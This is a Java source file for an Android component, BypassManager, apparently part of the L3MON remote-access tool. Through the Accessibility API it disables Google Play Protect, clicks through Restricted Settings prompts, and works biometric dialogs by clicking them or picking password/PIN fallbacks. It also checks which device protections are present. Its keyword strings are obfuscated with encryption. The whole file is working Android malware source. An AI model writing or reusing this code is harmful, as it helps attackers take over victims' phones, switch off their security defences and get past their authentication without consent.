package com.etechd.l3mon.managers;

import android.util.Log;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONArray;

import com.etechd.l3mon.StringCrypto;

public class BypassManager {

    private static final String TAG = "BypassManager";

    // ==================== PLAY PROTECT ====================
    public boolean disableGooglePlayProtect(AccessibilityNodeInfo root) {
        if (root == null)
            return false;

        boolean disabled = findAndDisablePlayProtectRecursive(root, 0);
        if (!disabled) {
            disabled = forceNavigateToPlayProtect(root);
        }
        return disabled;
    }

    private boolean findAndDisablePlayProtectRecursive(AccessibilityNodeInfo node, int depth) {
        if (node == null || depth > 8)
            return false;

        String combined = getCombinedText(node);

        if (combined.contains(StringCrypto.d("y2dLR9g092zhbrnuBuKhCQ==")) || // "play protect"
                combined.contains(StringCrypto.d("cZZHL1f47QiJhVIUDUqXV6dQIsVXvB47vKc/cpfL1/c=")) || // "verificar
                                                                                                     // ameaças"
                combined.contains(StringCrypto.d("uCJAL9kfr0+6APoMQjMEpBsvTk6f2azO9ffD5h0j8XA=")) || // "melhorar
                                                                                                     // detecção"
                combined.contains(StringCrypto.d("j710iaPOCRUUlMQf0p0fFwD35O4bPOpHFGoMsnAtmX0="))) { // "google play
                                                                                                     // protect"

            if (node.isClickable()) {
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                logBypass("Play Protect", "Toggle clicado");
                return true;
            }

            AccessibilityNodeInfo switchNode = findSwitchNearNode(node);
            if (switchNode != null) {
                switchNode.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                switchNode.recycle();
                logBypass("Play Protect", "Switch clicado");
                return true;
            }
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                if (findAndDisablePlayProtectRecursive(child, depth + 1)) {
                    child.recycle();
                    return true;
                }
                child.recycle();
            }
        }
        return false;
    }

    private boolean forceNavigateToPlayProtect(AccessibilityNodeInfo root) {
        try {
            if (findAndClickNodeWithText(root, StringCrypto.d("un76THR7zghYuE/GbtqP0A==")) || // "configurações"
                    findAndClickNodeWithText(root, StringCrypto.d("FChMFE/zZaG3HyzpTrhlRg=="))) { // "segurança"
                Thread.sleep(800);
                return false;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }

    // ==================== MÉTODO CORRIGIDO ====================
    private boolean findAndClickNodeWithText(AccessibilityNodeInfo node, String keyword) {
        if (node == null)
            return false;

        String text = safeToLower(node.getText());
        if (text.contains(keyword) && node.isClickable()) {
            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            return true;
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                if (findAndClickNodeWithText(child, keyword)) {
                    child.recycle();
                    return true;
                }
                child.recycle();
            }
        }
        return false;
    }

    private AccessibilityNodeInfo findSwitchNearNode(AccessibilityNodeInfo node) {
        AccessibilityNodeInfo parent = node.getParent();
        if (parent != null) {
            for (int i = 0; i < parent.getChildCount(); i++) {
                AccessibilityNodeInfo sibling = parent.getChild(i);
                if (sibling != null) {
                    String className = sibling.getClassName() != null ? sibling.getClassName().toString() : "";
                    if (className.contains("Switch") || className.contains("Toggle")) {
                        return sibling;
                    }
                    sibling.recycle();
                }
            }
            parent.recycle();
        }
        return null;
    }

    // ==================== RESTRICTED SETTINGS ====================
    public boolean bypassRestrictedSettings(AccessibilityNodeInfo root) {
        if (root == null)
            return false;
        return findAndClickRestrictedSettings(root);
    }

    private boolean findAndClickRestrictedSettings(AccessibilityNodeInfo node) {
        if (node == null)
            return false;

        String combined = getCombinedText(node);

        if (combined.contains(StringCrypto.d("bifHPq9Ll9nlfLcO16Pkc0TKcEDNIPfdLaPhNUlR8VY=")) || // "configurações
                                                                                                 // restritas"
                combined.contains(StringCrypto.d("eS5QcRENZMc4koeBMYGMwP4ZLvGc3p5t1Sp931oRiwo="))) { // "restricted
                                                                                                     // settings"

            if (node.isClickable()) {
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                logBypass("Restricted Settings", "Clicado");
                return true;
            }
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                if (findAndClickRestrictedSettings(child)) {
                    child.recycle();
                    return true;
                }
                child.recycle();
            }
        }
        return false;
    }

    // ==================== BIOMETRIA ====================
    public boolean bypassBiometry(AccessibilityNodeInfo root) {
        if (root == null)
            return false;

        boolean success = findAndApproveBiometricDialog(root);
        if (!success)
            success = findAndClickAlternativeAuth(root);
        return success;
    }

    private boolean findAndApproveBiometricDialog(AccessibilityNodeInfo node) {
        if (node == null)
            return false;

        String combined = getCombinedText(node);

        if (combined.contains(StringCrypto.d("H0xgaS0uFB7R9QoVMxASDg==")) || // "biometria"
                combined.contains(StringCrypto.d("AA56kJyyknIJ/wBojOy/6opE5Obrw/phw0a53PO1iKA=")) || // "impressão
                                                                                                     // digital"
                combined.contains(StringCrypto.d("5PfPDmHwu3zeqxUgCuVU+w==")) || // "face id"
                combined.contains(StringCrypto.d("1MhURfIEmWsUUIWqx2mtMHo+wlwILesOxROGsYl7Y1s="))) { // "reconhecimento
                                                                                                     // facial"

            if (node.isClickable()) {
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                return true;
            }
            return findAndClickAlternativeAuth(node);
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                if (findAndApproveBiometricDialog(child)) {
                    child.recycle();
                    return true;
                }
                child.recycle();
            }
        }
        return false;
    }

    private boolean findAndClickAlternativeAuth(AccessibilityNodeInfo node) {
        String[] alternatives = {
                StringCrypto.d("WzcU0njwTz+jAMiX2Ey3uA=="), // "usar senha"
                StringCrypto.d("dsqdotf5Sko+K1/CyrItMw=="), // "use password"
                StringCrypto.d("d4RThFgNtBTuJE6afnMzWg=="), // "usar pin"
                StringCrypto.d("euOyPYPH1TKZhf1IzLbA2Q=="), // "use pin"
                StringCrypto.d("gu3MjvrbZ7NlCWX+QXDeZQ=="), // "senha"
                StringCrypto.d("Jy5jW50bgS6lqjqpYWApfQ=="), // "password"
                StringCrypto.d("y6GXSDioPRRRZtA2YCk9Rw==") // "pin"
        };
        return findAndClickButtonWithKeywords(node, alternatives);
    }

    private boolean findAndClickButtonWithKeywords(AccessibilityNodeInfo node, String[] keywords) {
        if (node == null)
            return false;

        String combined = getCombinedText(node);
        for (String keyword : keywords) {
            if (combined.contains(keyword)) {
                if (node.isClickable()) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    return true;
                }
            }
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                if (findAndClickButtonWithKeywords(child, keywords)) {
                    child.recycle();
                    return true;
                }
                child.recycle();
            }
        }
        return false;
    }

    // ==================== UTILITÁRIOS ====================
    private String getCombinedText(AccessibilityNodeInfo node) {
        String text = safeToLower(node.getText());
        String desc = safeToLower(node.getContentDescription());
        String viewId = safeToLower(node.getViewIdResourceName());
        return text + " " + desc + " " + viewId;
    }

    private String safeToLower(CharSequence cs) {
        return cs != null ? cs.toString().toLowerCase() : "";
    }

    private void logBypass(String feature, String action) {
        Log.d(TAG, feature + " → " + action);
    }

    public JSONArray detectAndroidProtections() {
        JSONArray protections = new JSONArray();
        int version = android.os.Build.VERSION.SDK_INT;

        if (version >= 26)
            protections.put(StringCrypto.d("LF8vVzabwJlMIgNYLO8kiwf+ihAXJqi5AQIA355mk2I=")); // "GooglePlay Protect"
        if (version >= 23)
            protections.put(StringCrypto.d("SXoR/oJ6RaFCqUGP8hViUA==")); // "SafetyNet"
        if (version >= 31)
            protections.put(StringCrypto.d("lbYT/CXHWw6Gr997KtYvvQ==")); // "PlayIntegrity"
        if (version >= 33)
            protections.put(StringCrypto.d("Aq0iq1WtrUd/W65gcIjAlSW7XuC3EwuYieB4Oai6gsM=")); // "Restricted Settings"
        if (version >= 30)
            protections.put(StringCrypto.d("6FfibpCq0mQHrMbCDozEP0H5yQ1Xrb1Ib57z/NTbkQI=")); // "Accessibility Lock"

        return protections;
    }
}